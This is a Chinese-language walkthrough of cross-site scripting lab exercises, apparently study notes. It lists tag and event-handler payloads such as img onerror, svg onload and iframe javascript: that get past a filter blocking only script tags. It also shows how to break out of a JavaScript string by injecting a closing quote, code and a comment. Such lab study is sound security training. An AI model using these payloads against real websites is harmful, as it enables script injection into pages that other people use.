考虑尝试非 script 标签：

它到底是只拦了 script 这个标签名，还是所有 HTML 标签都拦？

尝试新标签，输入：<img src=x onerror=alert(1)>

常用替代标签

标签 Payload 何时触发
<img> <img src=x onerror=alert(1)> 图片加载失败
<svg> <svg/onload=alert(1)> 元素加载完
<body> <body onload=alert(1)> 页面加载完
<audio> <audio src=x onerror=alert(1)> 音频加载失败
<video> <video src=x onerror=alert(1)> 视频加载失败
<details> <details open ontoggle=alert(1)> 展开时触发
<marquee> <marquee onstart=alert(1)> 滚动开始时
<iframe> <iframe src=javascript:alert(1)> 伪协议

HTML 里能挂事件处理器的标签多了去了，拦了 script 拦不住 img，拦了 img 拦不住 svg，拦了 svg 拦不住 body……

example6

源码有所不同

意思是创建一个变量叫 $a，把字符串 1 存进去。

需要做的是：让浏览器执行 alert(1)，弹个框出来。

但是JavaScript 里，引号包起来的东西叫字符串，是数据，不是命令：

“alert(1)” 这是字符串，只是几个字，不会弹窗

alert(1) 这才是命令，会弹窗

所以需要提前闭合引号

var $a= “输入”; 如果你输入 "; alert(1);//，拼起来变成：

页面把输入放在了 JS 的字符串里。通过提前输入 " 关闭字符串，然后写自己的代码，再用 // 注释掉尾巴。这样就实现了代码执行。
